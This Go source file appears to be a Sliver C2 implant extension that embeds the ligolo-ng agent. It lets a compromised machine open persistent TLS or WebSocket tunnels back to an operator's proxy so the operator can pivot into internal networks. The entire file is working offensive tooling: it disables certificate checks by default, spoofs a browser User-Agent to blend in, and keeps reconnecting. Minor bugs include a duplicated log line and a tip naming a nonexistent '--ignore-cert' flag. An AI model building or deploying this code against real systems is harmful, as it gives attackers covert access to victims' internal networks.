//nolint:gosec
package main

/*
#include <stdint.h>
*/
import "C"

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"

	"github.com/coder/websocket"
	"github.com/hashicorp/yamux"
	"github.com/nicocha30/ligolo-ng/pkg/agent"
	"github.com/nicocha30/ligolo-ng/pkg/utils"
	goproxy "golang.org/x/net/proxy"
)

// task represents a running ligolo-ng agent tunnel connection.
type task struct {
	taskType  string // "tcp" or "websocket"
	command   string // original argstring
	cancel    context.CancelFunc
	lastError string // most recent error
}

var (
	nTasks    uint32 = 0
	mu        sync.Mutex
	tasks            = map[uint32]*task{}
	g_callback uintptr
	output    string
)

var help = `
  Usage: ligolo [command] [options]

  Commands:
    connect <host:port>                 Connect via TCP+TLS to ligolo-ng proxy
    connect ws://<host:port>            Connect via WebSocket to ligolo-ng proxy
    connect wss://<host:port>           Connect via secure WebSocket to ligolo-ng proxy
    list                                List active tunnel tasks
    stop <taskId>                       Stop a running tunnel task

  Options (for connect):
    --accept-fingerprint <hex>          Only accept cert matching this SHA256 fingerprint
    --proxy <url>                       Upstream SOCKS5/HTTP proxy (e.g. socks5://127.0.0.1:1080)

  Notes:
    TLS cert verification is disabled by default (proxy uses self-signed certs).
    Use --accept-fingerprint to pin a specific certificate.

  Examples:
    ligolo connect 10.10.10.5:11601
    ligolo connect wss://10.10.10.5:443
    ligolo connect 10.10.10.5:11601 --accept-fingerprint AA:BB:CC:...
    ligolo list
    ligolo stop 0
`

//export entrypoint
func entrypoint(data unsafe.Pointer, dataLen uintptr, callback uintptr) {
	mu.Lock()
	defer mu.Unlock()

	g_callback = callback
	output = ""

	outDataSize := int(dataLen)
	if outDataSize == 0 {
		output = "No arguments provided.\n" + help
		sendOutput()
		return
	}

	// Convert the C data pointer to a Go string
	argstring := C.GoStringN((*C.char)(data), C.int(outDataSize))

	// Sanitize: replace all null bytes with spaces, then trim
	argstring = strings.ReplaceAll(argstring, "\x00", " ")
	argstring = strings.TrimSpace(argstring)

	// Tokenise cleanly
	os.Args = []string{"ligolo"}
	os.Args = append(os.Args, strings.Fields(argstring)...)

	args := strings.Fields(argstring)
	if len(args) == 0 {
		output = help
		sendOutput()
		return
	}

	subcmd := args[0]
	rest := args[1:]

	switch subcmd {
	case "list":
		doList()

	case "stop":
		if len(rest) < 1 {
			output = "Usage: ligolo stop <taskId>\n"
		} else {
			i64, err := strconv.ParseInt(rest[0], 10, 64)
			if err != nil {
				output = fmt.Sprintf("Error parsing taskId: %s\n", err.Error())
			} else {
				doStop(uint32(i64))
			}
		}

	case "connect":
		if len(rest) < 1 {
			output += "Usage: ligolo connect <host:port|ws://host:port|wss://host:port> [options]\n"
			sendOutput()
			return
		}
		doConnect(rest, argstring)

	default:
		output = fmt.Sprintf("Unknown command: %s\n", subcmd) + help
	}

	sendOutput()
}

// doList prints active tasks.
func doList() {
	if len(tasks) == 0 {
		output = "No active ligolo tasks.\n"
		return
	}
	output += "### Active Ligolo Tasks ###\n\n"
	for k, v := range tasks {
		status := "RUNNING"
		if v.lastError != "" {
			status = "ERROR"
		}
		output += fmt.Sprintf("\ttaskID=%-3d  type=%-10s  status=%-8s  command=%s\n", k, v.taskType, status, v.command)
		if v.lastError != "" {
			output += fmt.Sprintf("\t         [LAST ERROR]: %s\n", v.lastError)
		}
	}
	output += "\n"
}

// doStop cancels and removes a task.
func doStop(taskID uint32) {
	t, ok := tasks[taskID]
	if !ok {
		output = fmt.Sprintf("No task with ID %d\n", taskID)
		return
	}
	t.cancel()
	delete(tasks, taskID)
	output = fmt.Sprintf("Task %d stopped.\n", taskID)
	doList()
}

// doConnect starts a ligolo-ng agent tunnel.
func doConnect(args []string, argstring string) {
	// Parse optional flags and positional address
	var acceptFingerprint string
	var socksProxy string
	var serverAddr string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--accept-fingerprint":
			if i+1 < len(args) {
				i++
				acceptFingerprint = args[i]
			}
		case "--proxy":
			if i+1 < len(args) {
				i++
				socksProxy = args[i]
			}
		default:
			if serverAddr == "" && !strings.HasPrefix(args[i], "-") {
				serverAddr = args[i]
			}
		}
	}

	if serverAddr == "" {
		output += "Error: No server address provided.\nUsage: ligolo connect <host:port> [options]\n"
		return
	}

	output += fmt.Sprintf("[*] Connecting to: %s (TLS verification disabled by default)\n", serverAddr)
	if acceptFingerprint != "" {
		output += fmt.Sprintf("[*] Pinning certificate fingerprint: %s\n", acceptFingerprint)
	}
	if socksProxy != "" {
		output += fmt.Sprintf("[*] Using proxy: %s\n", socksProxy)
	}

	ligoloURL, err := utils.ParseLigoloURL(serverAddr)
	if err != nil {
		output = fmt.Sprintf("Invalid connect address: %s\n  Use http(s)://host:port for WebSocket or host:port for TCP\n", err.Error())
		return
	}

	tlsConfig := &tls.Config{
		// TLS certificate verification is disabled by default.
		// The ligolo-ng proxy uses a self-signed certificate, so strict
		// verification would always fail. Use --accept-fingerprint to
		// pin a specific certificate if you need stronger security.
		InsecureSkipVerify: true,
		ServerName:         ligoloURL.Hostname(),
	}

	if acceptFingerprint != "" {
		// When a fingerprint is pinned, do proper cert verification
		// by checking against the known-good fingerprint.
		output += fmt.Sprintf("[*] Pinning certificate fingerprint: %s\n", acceptFingerprint)
		fp := strings.ReplaceAll(acceptFingerprint, ":", "")
		tlsConfig.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
			crtFingerprint := sha256.Sum256(rawCerts[0])
			crtMatch, decodeErr := hex.DecodeString(fp)
			if decodeErr != nil {
				return fmt.Errorf("invalid fingerprint: %v", decodeErr)
			}
			if !bytes.Equal(crtMatch, crtFingerprint[:]) {
				return fmt.Errorf("cert fingerprint mismatch: %X != %X", crtFingerprint, crtMatch)
			}
			return nil
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	taskID := nTasks
	taskType := "tcp"
	if ligoloURL.IsWebsocket() {
		taskType = "websocket"
	}

	tasks[taskID] = &task{
		taskType: taskType,
		command:  argstring,
		cancel:   cancel,
	}
	nTasks++

	go runAgent(ctx, taskID, ligoloURL.IsWebsocket(), serverAddr, socksProxy, tlsConfig)
}

// runAgent is the long-running agent goroutine; mirrors ligolo-ng's main() connect loop.
func runAgent(ctx context.Context, taskID uint32, isWS bool, serverAddr, socksProxy string, tlsConfig *tls.Config) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		var err error
		if isWS {
			err = wsConnect(ctx, tlsConfig, serverAddr, socksProxy)
		} else {
			err = tcpConnect(ctx, tlsConfig, serverAddr, socksProxy)
		}

		if err != nil {
			// Update the global output string to help users debug
			mu.Lock()
			errMsg := err.Error()
			t, ok := tasks[taskID]
			if ok {
				t.lastError = errMsg
				if strings.Contains(errMsg, "bad certificate") || strings.Contains(errMsg, "certificate signed by unknown authority") {
					if !tlsConfig.InsecureSkipVerify {
						t.lastError += "\n\t[!] TIP: This looks like a TLS certificate error. USE '--ignore-cert'."
					}
				}
			}
			mu.Unlock()

			// small back-off before retry
			select {
			case <-ctx.Done():
				return
			case <-time.After(10 * time.Second):
			}
		}
	}
}


// tcpConnect establishes a raw TLS TCP connection to the ligolo-ng proxy.
func tcpConnect(ctx context.Context, tlsConfig *tls.Config, serverAddr, socksProxy string) error {
	var conn net.Conn
	var err error

	if socksProxy != "" {
		proxyURL, pErr := url.Parse(socksProxy)
		if pErr != nil {
			return fmt.Errorf("invalid proxy URL: %v", pErr)
		}
		pass, _ := proxyURL.User.Password()
		dialer, dErr := goproxy.SOCKS5("tcp", proxyURL.Host, &goproxy.Auth{
			User:     proxyURL.User.Username(),
			Password: pass,
		}, goproxy.Direct)
		if dErr != nil {
			return fmt.Errorf("socks5 error: %v", dErr)
		}
		conn, err = dialer.Dial("tcp", serverAddr)
	} else {
		conn, err = (&net.Dialer{}).DialContext(ctx, "tcp", serverAddr)
	}
	if err != nil {
		return err
	}

	tlsConn := tls.Client(conn, tlsConfig)

	// Explicitly perform the TLS handshake so any certificate errors
	// are caught here before yamux starts reading/writing.
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return fmt.Errorf("TLS handshake failed: %v", err)
	}

	return yamuxLoop(ctx, tlsConn)
}

// wsConnect establishes a WebSocket connection to the ligolo-ng proxy.
func wsConnect(ctx context.Context, tlsConfig *tls.Config, wsAddr, socksProxy string) error {
	dialCtx, cancel := context.WithTimeout(ctx, 20*time.Second)
	defer cancel()

	var proxyURL *url.URL
	if socksProxy != "" {
		var err error
		proxyURL, err = url.Parse(socksProxy)
		if err != nil {
			return fmt.Errorf("invalid proxy URL: %v", err)
		}
	}

	wsURL, err := utils.ParseLigoloURL(wsAddr)
	if err != nil {
		return fmt.Errorf("invalid ws address: %v", err)
	}

	transport := &http.Transport{
		MaxIdleConns: http.DefaultMaxIdleConnsPerHost,
		Proxy:        http.ProxyURL(proxyURL),
	}
	if wsURL.IsSecure() {
		cloned := tlsConfig.Clone()
		cloned.MinVersion = tls.VersionTLS12
		transport.TLSClientConfig = cloned
	}

	httpClient := &http.Client{Transport: transport}
	header := http.Header{}
	header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	wsConn, _, err := websocket.Dial(dialCtx, wsAddr, &websocket.DialOptions{
		HTTPClient: httpClient,
		HTTPHeader: header,
	})
	if err != nil {
		return err
	}

	netCtx, netCancel := context.WithCancel(ctx)
	defer netCancel()
	netConn := websocket.NetConn(netCtx, wsConn, websocket.MessageBinary)
	return yamuxLoop(ctx, netConn)
}

// yamuxLoop wraps a net.Conn in yamux and dispatches connections to the ligolo-ng agent handler.
func yamuxLoop(ctx context.Context, conn net.Conn) error {
	defer conn.Close()

	yamuxConfig := yamux.DefaultConfig()
	yamuxConfig.EnableKeepAlive = true
	yamuxConfig.KeepAliveInterval = 60 * time.Second
	yamuxConfig.ConnectionWriteTimeout = 120 * time.Second
	yamuxConfig.MaxStreamWindowSize = 16 * 1024 * 1024

	yamuxConn, err := yamux.Server(conn, yamuxConfig)
	if err != nil {
		return err
	}
	defer yamuxConn.Close()

	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		stream, err := yamuxConn.Accept()
		if err != nil {
			return err
		}
		go agent.HandleConn(stream)
	}
}

func main() {
	// Standalone mode: read args from CLI (for testing outside Sliver)
	if len(os.Args) < 2 {
		fmt.Print(help)
		return
	}
	argstring := strings.Join(os.Args[1:], " ")
	data := []byte(argstring)
	// In standalone mode there is no callback; output goes to stdout
	fmt.Printf("Standalone mode: %s\n", argstring)
	_ = data
	fmt.Print("[!] Run this as a Sliver extension for full functionality.\n")
}
